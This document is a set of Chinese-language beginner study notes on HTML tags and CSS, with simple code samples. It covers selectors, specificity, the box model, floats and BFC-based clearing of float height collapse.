<h2>其一</h2>\n</hgroup>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n# 文字标签\n\n文字标签包含：\n\n * p： 块元素，表示一个段落\n * em：语音语调的加重，行内元素\n * strong：强调，表示内容重要\n * blockquote：长引用\n * q：短引用\n * br：换行\n\n\x3c!-- \np标签表示页面中的一个段落\n\np也是一个块元素\n--\x3e\n<p>在p标签中的内容就表示一个段落</p>\n<p>在p标签中的内容就表示一个段落</p>\n\n\x3c!-- \nem标签用于表示语音语调的一个加重\n\n在页面中不会独占一行的元素称为行内元素（inline element）\n--\x3e\n<p>今天天气<em>真</em>不错！</p>\n\n\x3c!-- \nstrong表示强调，重要内容！\n--\x3e\n<p>你今天必须要<strong>完成作业</strong>！</p>\n\n鲁迅说：\n\x3c!-- blockquote 表示一个长引用 --\x3e\n<blockquote>\n  这句话我是从来没有说过的！\n</blockquote>\n\n\x3c!-- \nq表示一个短引用\n--\x3e\n子曰<q>学而时习之，乐呵乐呵！</q>\n\n\x3c!-- \nbr标签表示页面中的换行\n--\x3e\n<br>\n<br>\n\n今天天气真不错\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n# 块元素和行内元素\n\n块元素（block element）\n\n * 在网页中一般通过块元素来对页面进行布局\n\n行内元素(inline element）\n\n * 行内元素主要用来包裹文字\n\n * 在块元素中放行内元素，而不会在行内元素中放块元素\n\n * 块元素中基本上什么都能放\n\n * p元素中不能放任何的块元素\n\n浏览器在解析网页时，会自动对网页中不符合规范的内容进行修正\n\n * 标签写在了根元素的外部\n * p元素中嵌套了块元素\n * 根元素中出现了除head和body以外的子元素\n\n# 布局标签\n\n * header 表示网页的头部\n * main 表示网页的主体部分(一个页面中只会有一个main)\n * footer 表示网页的底部\n * nav 表示网页中的导航\n * aside 和主体相关的其他内容（侧边栏）\n * article 表示一个独立的文章\n * section 表示一个独立的区块，上边的标签都不能表示时使用section\n * div 没有语义，就用来表示一个区块，目前来讲div还是我们主要的布局元素\n * span 行内元素，没有任何的语义，一般用于在网页中选中文字\n\n\n# 列表\n\n# 有序列表\n\n使用ol标签来创建无序列表，使用li表示列表项\n\n# 无序列表\n\n使用ul标签来创建无序列表，使用li表示列表项\n\n# 定义列表\n\n使用dl标签来创建一个定义列表，使用dt来表示定义的内容，使用dd来对内容进行解释说明\n\n<ul>\n  <li>结构</li>\n  <li>表现</li>\n  <li>行为</li>\n</ul>\n\n<ol>\n  <li>结构</li>\n  <li>表现</li>\n  <li>行为</li>\n</ol>\n\n\n<dl>\n  <dt>结构</dt>\n  <dd>结构表示网页的结构，结构用来规定网页中哪里是标题，哪里是段落</dd>\n  <dd>结构表示网页的结构，结构用来规定网页中哪里是标题，哪里是段落</dd>\n  <dd>结构表示网页的结构，结构用来规定网页中哪里是标题，哪里是段落</dd>\n</dl>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 超链接\n\n超链接可以让我们从一个页面跳转到其他页面，或者是当前页面的其他的位置\n\n使用 a 标签来定义超链接，href 指定跳转的目标路径。值可以是一个外部网站的地址，也可以写一个内部页面的地址。超链接是也是一个行内元素，在a标签中可以嵌套除它自身外的任何元素。\n\ntarget属性，用来指定超链接打开的位置，_self 默认值 在当前页面中打开超链接，_blank 在一个新的要么中打开超链接。\n\n可以直接将超链接的href属性设置为#，这样点击超链接以后，页面不会发生跳转，而是转到当前页面的顶部的位置。可以跳转到页面的指定位置，只需将href属性设置 #目标元素的id属性值。\n\n<a id="bottom" href="#">回到顶部</a>\n\n\n1\n\n\n\n# 图片标签\n\n图片标签用于向当前页面中引入一个外部图片，使用img标签来引入外部图片，img标签是一个自结束标签。 img这种元素属于替换元素（块和行内元素之间，具有两种元素的特点）。\n\n相关属性：\n\n * src 属性指定的是外部图片的路径（路径规则和超链接是一样的）\n * alt 图片的描述，这个描述默认情况下不会显示，有些浏览器会图片无法加载时显示，搜索引擎会根据alt中的内容来识别图片，如果不写alt属性则图片不会被搜索引擎所收录\n * width 图片的宽度 (单位是像素)\n * height 图片的高度\n   * 宽度和高度中如果只修改了一个，则另一个会等比例缩放\n   * 一般情况在pc端，不建议修改图片的大小，需要多大的图片就裁多大\n   * 但是在移动端，经常需要对图片进行缩放（大图缩小）\n\n<img src="./img/1.gif" alt="松鼠">\n\n<img width="200"  src="https://d2ggl082rr1mkp.cloudfront.net/category/IronMan_preview_1521810286_220_310.jpeg" alt="钢铁侠">\n\n\n1\n2\n3\n\n\n\n# 内联框架\n\n内联框架，用于向当前页面中引入一个其他页面\n\n * src 指定要引入的网页的路径\n * frameborder 指定内联框架的边框\n\n<iframe src="https://www.qq.com" width="800" height="600" frameborder="0"></iframe>\n<h1>Hello</h1>\n\n\n1\n2\n\n\n\n# 多媒体\n\naudio 标签用来向页面中引入一个外部的音频文件的，音视频文件引入时，默认情况下不允许用户自己控制播放停止。\n\n * controls 是否允许用户控制播放\n\n * autoplay 音频文件是否自动播放\n\n * 如果设置了autoplay 则音乐在打开页面时会自动播放\n\n * 但是目前来讲大部分浏览器都不会自动对音乐进行播放\n\n * loop 音乐是否循环播放\n\n\x3c!-- <audio src="./source/audio.mp3" controls autoplay loop></audio> --\x3e\n\x3c!-- <audio src="./source/audio.mp3" controls></audio> --\x3e\n\x3c!-- 除了通过src来指定外部文件的路径以外，还可以通过source来指定文件的路径 --\x3e\n<audio controls>\n  \x3c!-- 对不起，您的浏览器不支持播放音频！请升级浏览器！ --\x3e\n  <source src="./source/audio.mp3">\n  <source src="./source/audio.ogg">\n  <embed src="./source/audio.mp3" type="audio/mp3" width="300" height="100">\n</audio>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n使用video标签来向网页中引入一个视频，使用方式和audio基本上是一样的\n\n<video controls>\n  <source src="./source/flower.webm">\n  <source src="./source/flower.mp4">\n  <embed src="./source/flower.mp4" type="video/mp4">\n</video>\n\n\n1\n2\n3\n4\n5\n\n\n\n# 表格\n\n\n# 表单\n\n\n# CSS样式\n\n\n# CSS简介\n\n网页分成三个部分：\n\n * 结构(HTML)\n * 表现(CSS)\n * 行为(JavaScript)\n\nCSS全称Cascading Style Sheets，层叠样式表。网页实际上是一个多层的结构，通过CSS可以分别为网页的每一个层来设置样式\n\n而最终我们能看到只是网页的最上边一层。总之一句话，CSS用来设置网页中元素的样式。\n\n使用CSS来修改元素的样式，有以下三种方式：\n\n * 第一种方式(内联样式，行内样式)：\n   * 在标签内部通过style属性来设置元素的样式\n   * 使用内联样式，样式只能对一个标签生效，如果希望影响到多个元素必须在每一个元素中都复制一遍\n   * 并且当样式发生变化时，我们必须要一个一个的修改，非常的不方便\n   * 注意：开发时绝对不要使用内联样式\n\n<p style="color:red; font-size: 60px;">少小离家老大回，乡音无改鬓毛衰</p>\n\n<p style="color: red; font-size: 60px;">今天天气真不错！</p>\n\n\n1\n2\n3\n\n\n * 第二种方式（内部样式表）\n   \n   * 将样式编写到head中的style标签里，然后通过CSS的选择器来选中元素并为其设置各种样式\n   \n   * 可以同时为多个标签设置样式，并且修改时只需要修改一处即可全部应用\n   \n   * 内部样式表更加方便对样式进行复用\n   \n   * 我们的内部样式表只能对一个网页起作用，它里边的样式不能跨页面进行复用\n\n<style>\n\n  p{\n    color: green;\n    font-size: 50px;\n  }\n\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * 第三种方式 （外部样式表） 最佳实践\n   * 可以将CSS样式编写到一个外部的CSS文件中，然后通过link标签来引入外部的CSS文件\n   * 外部样式表需要通过link标签进行引入，意味着只要想使用这些样式的网页都可以对其进行引用。使样式可以在不同页面之间进行复用\n   * 将样式编写到外部的CSS文件中，可以使用到浏览器的缓存机制，从而加快网页的加载速度，提高用户的体验。\n\n<link rel="stylesheet" href="./style.css">\n\n\n1\n\n\np{\n    color: tomato;\n    font-size: 50px;\n}\n\n\n1\n2\n3\n4\n\n\n\n# CSS基本语法\n\nCSS由两部分组成，选择器和声明块，其中选择器用于选中需要添加样式的元素，声明块是对样式的具体设置。\n\n * 选择器，通过选择器可以选中页面中的指定元素。比如 p 的作用就是选中页面中所有的p元素\n * 声明块，通过声明块来指定要为元素设置的样式，声明块由一个一个的声明组成，一个名值对结构。一个样式名对应一个样式值，名和值之间以:连接，以;结尾。\n\np{\n  color: red;\n  font-size: 40px;\n}\n\nh1{\n  color: green;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# CSS选择器\n\n# 元素选择器\n\n作用：根据标签名来选中指定的元素\n\n语法：标签名{}\n\n例子：p{} h1{} div{}\n\n# ID选择器\n\n作用：根据元素的id属性值选中一个元素\n\n语法：#id属性值{}\n\n例子：#box{} #red{}\n\n# 类选择器\n\n作用：根据元素的class属性值选中一组元素\n\n语法：.class属性值\n\n# 通配选择器\n\n作用：选中页面中的所有元素\n\n语法: *\n\n# 交集选择器\n\n作用：选中同时复合多个条件的元素\n\n语法：选择器1选择器2选择器3选择器n{}\n\n注意点：交集选择器中如果有元素选择器，必须使用元素选择器开头\n\ndiv.red{\n    font-size: 30px;\n}\n\n.a.b.c{\n    color: blue\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 选择器分组\n\n选择器分组（并集选择器）\n\n作用：同时选择多个选择器对应的元素\n\n语法：选择器1,选择器2,选择器3,选择器n{}\n\n#b1,.p1,h1,span,div.red{}\n\n# 子元素选择器\n\n父元素\n\n * 直接包含子元素的元素叫做父元素\n\n子元素\n\n * 直接被父元素包含的元素是子元素\n\n祖先元素\n\n * 直接或间接包含后代元素的元素叫做祖先元素\n * 一个元素的父元素也是它的祖先元素\n\n后代元素\n\n * 直接或间接被祖先元素包含的元素叫做后代元素\n * 子元素也是后代元素\n\n兄弟元素\n\n * 拥有相同父元素的元素是兄弟元素\n\n作用：选中指定父元素的指定子元素\n\n语法：父元素 > 子元素\n\n# 后代选择器\n\n作用：选中指定元素内的指定后代元素\n\n语法：祖先 后代\n\n# 兄弟元素选择器\n\n * 选择下一个兄弟\n\n语法：前一个 + 下一个\n\n * 选择下边所有的兄弟\n\n语法：兄 ~ 弟\n\n# 属性选择器\n\n[属性名] 选择含有指定属性的元素\n\n[属性名=属性值] 选择含有指定属性和属性值的元素\n\n[属性名^=属性值] 选择属性值以指定值开头的元素\n\n[属性名$=属性值] 选择属性值以指定值结尾的元素\n\n[属性名*=属性值] 选择属性值中含有某值的元素的元素\n\n# 伪类选择器\n\n伪类（不存在的类，特殊的类）\n\n * 伪类用来描述一个元素的特殊状态\n\n比如：第一个子元素、被点击的元素、鼠标移入的元素...\n\n伪类一般情况下都是使用:开头\n\n * :first-child 第一个子元素\n\n * :last-child 最后个子元素\n\n * :nth-child() 选中第n个子元素\n\n特殊值：\n\n * n 第n个 n的范围0到正无穷\n\n * 2n 或 even 表示选中偶数位的元素\n\n * 2n+1 或 odd 表示选中奇数位的元素\n\n以上这些伪类都是根据所有的子元素进行排序\n\n * :first-of-type\n\n * :last-of-type\n\n * :nth-of-type()\n\n这几个伪类的功能和上述的类似，不通点是他们是在同类型元素中进行排序\n\n * :not() 否定伪类\n\n将符合条件的元素从选择器中去除\n\n# 伪元素选择器\n\n伪元素，表示页面中一些特殊的并不真实的存在的元素（特殊的位置）\n\n伪元素使用 :: 开头\n\n * ::first-letter 表示第一个字母\n\n * ::first-line 表示第一行\n\n * ::selection 表示选中的内容\n\n * ::before 元素的开始\n\n * ::after 元素的最后\n\n * before 和 after 必须结合content属性来使用\n\n# 样式继承\n\n我们为一个元素设置的样式同时也会应用到它的后代元素上，继承是发生在祖先后后代之间的\n\n继承的设计是为了方便我们的开发，利用继承我们可以将一些通用的样式统一设置到共同的祖先元素上，这样只需设置一次即可让所有的元素都具有该样式\n\n注意：并不是所有的样式都会被继承：比如背景相关的，布局相关等的这些样式都不会被继承。\n\n# 选择器权重\n\n当我们通过不同的选择器，选中相同的元素，并且为相同的样式设置不同的值时，此时就发生了样式的冲突。发生样式冲突时，应用哪个样式由选择器的权重（优先级）决定。\n\n内联样式        1,0,0,0\n\nid选择器        0,1,0,0\n\n类和伪类选择器   0,0,1,0\n\n元素选择器       0,0,0,1\n\n通配选择器       0,0,0,0\n\n继承的样式       没有优先级\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n比较优先级时，需要将所有的选择器的优先级进行相加计算，最后优先级越高，则越优先显示（分组选择器是单独计算的），选择器的累加不会超过其最大的数量级，类选择器在高也不会超过id选择器。如果优先级计算后相同，此时则优先使用靠下的样式。可以在某一个样式的后边添加 !important ，则此时该样式会获取到最高的优先级，甚至超过内联样式，在开发中这个玩意一定要慎用！\n\n\n# 单位\n\n像素\n\n * 屏幕（显示器）实际上是由一个一个的小点点构成的\n * 不同屏幕的像素大小是不同的，像素越小的屏幕显示的效果越清晰\n * 所以同样的200px在不同的设备下显示效果不一样\n\n百分比\n\n * 也可以将属性值设置为相对于其父元素属性的百分比\n * 设置百分比可以使子元素跟随父元素的改变而改变\n\nem\n\n * em是相对于元素的字体大小来计算的\n * 1em = 1font-size\n * em会根据字体大小的改变而改变\n\nrem\n\n * rem是相对于根元素的字体大小来计算\n\n\n# 颜色\n\n在CSS中可以直接使用颜色名来设置各种颜色，比如：red、orange、yellow、blue、green……，但是在css中直接使用颜色名是非常的不方便。\n\nRGB值：\n\n * RGB通过三种颜色的不同浓度来调配出不同的颜色\n * R red，G green ，B blue\n * 每一种颜色的范围在 0 - 255 (0% - 100%) 之间\n * 语法：RGB(红色,绿色,蓝色)\n\nRGBA:\n\n * 就是在rgb的基础上增加了一个a表示不透明度\n * 需要四个值，前三个和rgb一样，第四个表示不透明度 1表示完全不透明 0表示完全透明 .5半透明\n\n十六进制的RGB值：\n\n * 语法：#红色绿色蓝色\n * 颜色浓度通过 00-ff\n * 如果颜色两位两位重复可以进行简写 #aabbcc --\x3e #abc\n\nHSL值 HSLA值\n\n * H 色相(0 - 360)\n * S 饱和度，颜色的浓度 0% - 100%\n * L 亮度，颜色的亮度 0% - 100%\n\nbackground-color: red;\nbackground-color: rgb(255, 0, 0);\nbackground-color: rgb(0, 255, 0);\nbackground-color: rgb(0, 0, 255);\nbackground-color: rgb(255,255,255);\nbackground-color: rgb(106,153,85);\nbackground-color: rgba(106,153,85,.5);\nbackground-color: #ff0000;\nbackground-color: #ffff00;\nbackground-color: #ff0;\nbackground-color: #bbffaa;\nbackground-color: #9CDCFE;\nbackground-color: rgb(254, 156, 156);\nbackground-color: hsla(98, 48%, 40%, 0.658);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 布局\n\n# 文档流\n\n文档流（normal flow）\n\n网页是一个多层的结构，一层摞着一层，通过CSS可以分别为每一层来设置样式，作为用户来讲只能看到最顶上一层。这些层中，最底下的一层称为文档流，文档流是网页的基础。我们所创建的元素默认都是在文档流中进行排列。对于我们来元素主要有两个状态，在文档流中，不在文档流中（脱离文档流）\n\n元素在文档流中有什么特点：\n\n * 块元素\n   * 块元素会在页面中独占一行(自上向下垂直排列)\n   * 默认宽度是父元素的全部（会把父元素撑满）\n   * 默认高度是被内容撑开（子元素）\n * 行内元素\n   * 行内元素不会独占页面的一行，只占自身的大小\n   * 行内元素在页面中左向右水平排列，如果一行之中不能容纳下所有的行内元素，则元素会换到第二行继续自左向右排列（书写习惯一致）\n   * 行内元素的默认宽度和高度都是被内容撑开\n\n# 盒子模型\n\n盒模型、盒子模型、框模型（box model）\n\nCSS将页面中的所有元素都设置为了一个矩形的盒子，将元素设置为矩形的盒子后，对页面的布局就变成将不同的盒子摆放到不同的位位置。每一个盒子都由一下几个部分组成：\n\n * 内容区（content）\n\n * 内边距（padding）\n\n * 边框（border）\n\n * 外边距（margin）\n\n# 内容区\n\n内容区（content），元素中的所有的子元素和文本内容都在内容区中排列，内容区的大小由width 和 height两个属性来设置\n\n * width 设置内容区的宽度\n\n * height 设置内容区的高度\n\n# 边框\n\n边框（border），边框属于盒子边缘，边框里边属于盒子内部，出了边框都是盒子的外部，边框的大小会影响到整个盒子的大小。要设置边框，需要至少设置三个样式：\n\n * 边框的宽度 border-width\n\nborder-width: 10px;\n\n边框的默认值一般都是 3个像素，border-width可以用来指定四个方向的边框的宽度。\n\n根据不同的值的情况，有以下几种设置方式：\n\n * 四个值：上 右 下 左\n\n * 三个值：上 左右 下\n\n * 两个值：上下 左右\n\n * 一个值：上下左右\n\n除了border-width还有一组 border-xxx-width，xxx可以是 top right bottom left。用来单独指定某一个边的宽度\n\n * 边框的颜色 border-color\n\nborder-color用来指定边框的颜色，同样可以分别指定四个边的边框，规则和border-width一样\n\nborder-color也可以省略不写，如果省略了则自动使用color的颜色值。\n\n * 边框的样式 border-style\n\nborder-style 指定边框的样式\n\n * solid 表示实线\n\n * dotted 点状虚线\n\n * dashed 虚线\n\n * double 双线\n\n * border-style的默认值是none 表示没有边框\n\nborder简写属性，通过该属性可以同时设置边框所有的相关样式，并且没有顺序要求。除了border以外还有四个 border-xxx\n\n * border-top\n\n * border-right\n\n * border-bottom\n\n * border-left\n\nborder: solid 10px orange;\nborder-top: 10px solid red\n\n\n1\n2\n\n\n# 内边距\n\n内容区和边框之间的距离是内边距，一共有四个方向的内边距：\n\n * padding-top\n * padding-right\n * padding-bottom\n * padding-left\n\n内边距的设置会影响到盒子的大小，背景颜色会延伸到内边距上。一个盒子的可见框的大小，由内容区 内边距 和 边框共同决定，所以在计算盒子大小时，需要将这三个区域加到一起计算。\n\n/* padding-top: 100px;\npadding-left: 100px;\npadding-right: 100px;\npadding-bottom: 100px; */\n\n/* \npadding 内边距的简写属性，可以同时指定四个方向的内边距\n规则和border-width 一样\n*/\npadding: 10px 20px 30px 40px;\npadding: 10px 20px 30px ;\npadding: 10px 20px ;\npadding: 10px ;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 外边距\n\n外边距不会影响盒子可见框的大小，但是外边距会影响盒子的位置。一共有四个方向的外边距：\n\nmargin-top\n\n * 上外边距，设置一个正值，元素会向下移动\n\nmargin-right\n\n * 默认情况下设置margin-right不会产生任何效果\n\nmargin-bottom\n\n * 下外边距，设置一个正值，其下边的元素会向下移动\n\nmargin-left\n\n * 左外边距，设置一个正值，元素会向右移动\n\nmargin也可以设置负值，如果是负值则元素会向相反的方向移动。元素在页面中是按照自左向右的顺序排列的，所以默认情况下如果我们设置的左和上外边距则会移动元素自身。而设置下和右外边距会移动其他元素\n\nmargin的简写属性：margin 可以同时设置四个方向的外边距 ，用法和padding一样。margin会影响到盒子实际占用空间。\n\n/* margin-top: 100px;\nmargin-left: 100px;\nmargin-bottom: 100px; */\n\n/* margin-bottom: 100px; */\n/* margin-top: -100px; */\n/* margin-left: -100px; */\n/* margin-bottom: -100px; */\n\n/* margin-right: 0px; */\n\nmargin: 100px;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 盒子模型的水平布局\n\n元素的水平方向的布局：元素在其父元素中水平方向的位置由以下几个属性共同决定：\n\n * margin-left\n * border-left\n * padding-left\n * width\n * padding-right\n * border-right\n * margin-right\n\n一个元素在其父元素中，水平布局必须要满足以下的等式 margin-left+border-left+padding-left+width+padding-right+border-right+margin-right = 其父元素内容区的宽度 （必须满足）\n\n如以下的例子：\n\n0 + 0 + 0 + 200 + 0 + 0 + 0 = 800\n0 + 0 + 0 + 200 + 0 + 0 + 600 = 800\n100 + 0 + 0 + 200 + 0 + 0 + 400 = 800\n100 + 0 + 0 + 200 + 0 + 0 + 500 = 800\n\n\n1\n2\n3\n4\n\n\n以上等式必须满足，如果相加结果使等式不成立，则称为过度约束，则等式会自动调整。\n\n调整的方式：\n\n如果这七个值中没有为 auto 的情况，则浏览器会自动调整margin-right值以使等式满足。这七个值中有三个值可以设置为auto\n\n * width\n * margin-left\n * maring-right\n\n如果某个值为auto，则会自动调整为auto的那个值以使等式成立。\n\n0 + 0 + 0 + auto + 0 + 0 + 0 = 800  auto = 800\n0 + 0 + 0 + auto + 0 + 0 + 200 = 800  auto = 600\n200 + 0 + 0 + auto + 0 + 0 + 200 = 800  auto = 400\nauto + 0 + 0 + 200 + 0 + 0 + 200 = 800  auto = 400\nauto + 0 + 0 + 200 + 0 + 0 + auto = 800  auto = 300\n\n\n1\n2\n3\n4\n5\n\n\n如果将一个宽度和一个外边距设置为auto，则宽度会调整到最大，设置为auto的外边距会自动为0。\n\n如果将三个值都设置为auto，则外边距都是0，宽度最大\n\n如果将两个外边距设置为auto，宽度固定值，则会将外边距设置为相同的值。所以我们经常利用这个特点来使一个元素在其父元素中水平居中。\n\nwidth:xxxpx;\nmargin:0 auto;\n\n\n1\n2\n\n\n# 盒子垂直布局\n\n默认情况下父元素的高度被内容撑开，子元素是在父元素的内容区中排列的，如果子元素的大小超过了父元素，则子元素会从父元素中溢出。使用 overflow 属性来设置父元素如何处理溢出的子元素：\n\n * visible，默认值 子元素会从父元素中溢出，在父元素外部的位置显示\n\n * hidden 溢出内容将会被裁剪不会显示\n\n * scroll 生成两个滚动条，通过滚动条来查看完整的内容\n\n * auto 根据需要生成滚动条\n\noverflow-x: \n\noverflow-y:\n\n\n1\n2\n3\n\n\n# 垂直外边距的折叠\n\n相邻的垂直方向外边距会发生重叠现象\n\n兄弟元素\n\n * 兄弟元素间的相邻垂直外边距会取两者之间的较大值（两者都是正值）\n\n * 特殊情况：如果相邻的外边距一正一负，则取两者的和。如果相邻的外边距都是负值，则取两者中绝对值较大的\n\n * 兄弟元素之间的外边距的重叠，对于开发是有利的，所以我们不需要进行处理\n\n父子元素\n\n * 父子元素间相邻外边距，子元素的会传递给父元素（上外边距）\n * 父子外边距的折叠会影响到页面的布局，必须要进行处理\n\n# 行内元素的盒子模型\n\n * 行内元素不支持设置宽度和高度\n\n * 行内元素可以设置padding，但是垂直方向padding不会影响页面的布局\n\n * 行内元素可以设置border，垂直方向的border不会影响页面的布局\n\n * 行内元素可以设置margin，垂直方向的margin不会影响布局\n\ndisplay 用来设置元素显示的类型，有以下几种可选值。\n\n * inline 将元素设置为行内元素\n\n * block 将元素设置为块元素\n\n * inline-block 将元素设置为行内块元素，既可以设置宽度和高度又不会独占一行\n\n * table 将元素设置为一个表格\n\n * none 元素不在页面中显示\n\nvisibility 用来设置元素的显示状态\n\n * visible 默认值，元素在页面中正常显示\n\n * hidden 元素在页面中隐藏 不显示，但是依然占据页面的位置\n\n# 默认样式\n\n通常情况，浏览器都会为元素设置一些默认样式，默认样式的存在会影响到页面的布局，通常情况下编写网页时必须要去除浏览器的默认样式（PC端的页面）。\n\nbody{\n  margin: 0;\n}\n\np{\n  margin: 0;\n}\n\nul{\n  margin: 0;\n  padding: 0;\n  /*去除项目符号*/\n  list-style:none; \n}\n\n*{\n  margin: 0;\n  padding: 0;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n重置样式表：专门用来对浏览器的样式进行重置的。\n\n * reset.css 直接去除了浏览器的默认样式\n * normalize.css 对默认样式进行了统一\n\n# 盒子尺寸\n\n默认情况下，盒子可见框的大小由内容区、内边距和边框共同决定。box-sizing 用来设置盒子尺寸的计算方式（设置width和height的作用）。\n\n * content-box 默认值，宽度和高度用来设置内容区的大小\n\n * border-box 宽度和高度用来设置整个盒子可见框的大小\n\n * width 和 height 指的是内容区 和 内边距 和 边框的总大小\n\n# 轮廓和圆角\n\nbox-shadow 用来设置元素的阴影效果，阴影不会影响页面布局 。\n\n * 第一个值 水平偏移量 设置阴影的水平位置 正值向右移动 负值向左移动\n\n * 第二个值 垂直偏移量 设置阴影的水平位置 正值向下移动 负值向上移动\n\n * 第三个值 阴影的模糊半径\n\n * 第四个值 阴影的颜色\n\noutline 用来设置元素的轮廓线，用法和border一模一样。轮廓和边框不同的点，就是轮廓不会影响到可见框的大小。\n\nborder-radius: 用来设置圆角 圆角设置的圆的半径大小：\n\n/* border-top-left-radius:  */\n/* border-top-right-radius */\n/* border-bottom-left-radius:  */\n/* border-bottom-right-radius:  */\n/* border-top-left-radius:50px 100px; */\n\n\n1\n2\n3\n4\n5\n\n\nborder-radius 可以分别指定四个角的圆角\n\n * 四个值 左上 右上 右下 左下\n\n * 三个值 左上 右上/左下 右下\n\n * 两个个值 左上/右下 右上/左下\n\n/* 将元素设置为一个圆形 */\nborder-radius: 50%;    \n\n\n1\n2\n\n\n\n# 浮动\n\n通过浮动可以使一个元素向其父元素的左侧或右侧移动，使用 float 属性来设置于元素的浮动。\n\n * none 默认值 ，元素不浮动\n\n * left 元素向左浮动\n\n * right 元素向右浮动\n\n注意，元素设置浮动以后，水平布局的等式便不需要强制成立。元素设置浮动以后，会完全从文档流中脱离，不再占用文档流的位置，所以元素下边的还在文档流中的元素会自动向上移动。\n\n浮动的特点：\n\n1、浮动元素会完全脱离文档流，不再占据文档流中的位置\n\n2、设置浮动以后元素会向父元素的左侧或右侧移动，\n\n3、浮动元素默认不会从父元素中移出\n\n4、浮动元素向左或向右移动时，不会超过它前边的其他浮动元素\n\n5、如果浮动元素的上边是一个没有浮动的块元素，则浮动元素无法上移\n\n6、浮动元素不会超过它上边的浮动的兄弟元素，最多最多就是和它一样高\n\n7、浮动元素不会盖住文字，文字会自动环绕在浮动元素的周围，所以我们可以利用浮动来设置文字环绕图片的效果\n\n简单总结：\n\n浮动目前来讲它的主要作用就是让页面中的元素可以水平排列，通过浮动可以制作一些水平方向的布局。元素设置浮动以后，将会从文档流中脱离，从文档流中脱离后，元素的一些特点也会发生变化。\n\n脱离文档流的特点：\n\n块元素：\n\n1、块元素不在独占页面的一行\n\n2、脱离文档流以后，块元素的宽度和高度默认都被内容撑开\n\n行内元素：\n\n1、行内元素脱离文档流以后会变成块元素，特点和块元素一样\n\n脱离文档流以后，不需要再区分块和行内了\n\n# 网页的基础布局\n\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="X-UA-Compatible" content="ie=edge">\n    <title>Document</title>\n    <style>\n\n      header, main, footer{\n        width: 1000px;\n        margin: 0 auto;\n      }\n\n      /* 设置头部 */\n      header{\n        height: 150px;\n        background-color: silver;\n      }\n\n      /* 设置主体 */\n      main{\n        height: 500px;\n        background-color: #bfa;\n        margin: 10px auto;\n      }\n\n      nav, article, aside{\n        float: left;\n        height: 100%;\n      }\n\n      /* 设置左侧的导航 */\n      nav{\n        width: 200px;\n        background-color: yellow;\n      }\n\n      /* 设置中间的内容 */\n      article{\n        width: 580px;\n        background-color: orange;\n        margin: 0 10px;\n      }\n\n      /* 设置右侧的内容 */\n      aside{\n        width: 200px;\n        background-color: pink;\n      }\n\n      /* 设置底部 */\n      footer{\n        height: 150px;\n        background-color: tomato;\n      }\n    </style>\n  </head>\n  <body>\n\n    \x3c!-- 创建头部 --\x3e\n    <header></header>\n\n    \x3c!-- 创建网页的主体 --\x3e\n    <main>\n      \x3c!-- 左侧导航 --\x3e\n      <nav></nav>\n\n      \x3c!-- 中间的内容 --\x3e\n      <article></article>\n\n      \x3c!-- 右边的边栏 --\x3e\n      <aside></aside>\n\n    </main>\n\n    \x3c!-- 网页的底部 --\x3e\n    <footer></footer>\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n\n\n# 高度塌陷问题\n\n在浮动布局中，父元素的高度默认是被子元素撑开的，当子元素浮动后，其会完全脱离文档流，子元素从文档流中脱离，将会无法撑起父元素的高度，导致父元素的高度丢失。父元素高度丢失以后，其下的元素会自动上移，导致页面的布局混乱。所以高度塌陷是浮动布局中比较常见的一个问题，这个问题我们必须要进行处理！\n\nBFC(Block Formatting Context) 块级格式化环境：BFC是一个CSS中的一个隐含的属性，可以为一个元素开启BFC。开启BFC该元素会变成一个独立的布局区域\n\n元素开启BFC后的特点：\n\n 1. 开启BFC的元素不会被浮动元素所覆盖\n 2. 开启BFC的元素子元素和父元素外边距不会重叠\n 3. 开启BFC的元素可以包含浮动的子元素\n\n可以通过一些特殊方式来开启元素的BFC：\n\n 1. 设置元素的浮动（不推荐）\n 2. 将元素设置为行内块元素（不推荐）\n 3. 将元素的overflow设置为一个非visible的值\n\n常用的方式：为元素设置 overflow:hidden 开启其BFC 以使其可以包含浮动元素。\n\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="X-UA-Compatible" content="ie=edge">\n    <title>Document</title>\n    <style>\n      .outer{\n        border: 10px red solid;\n        overflow: hidden;\n      }\n\n      .inner{\n        width: 100px;\n        height: 100px;\n        background-color: #bfa;\n        float: left;\n      }\n    </style>\n  </head>\n  <body>\n\n    <div class="outer">\n\n      <div class="inner"></div>\n\n    </div>\n\n    <div style="width: 200px;height: 200px;background-color:yellow;"></div>\n\n  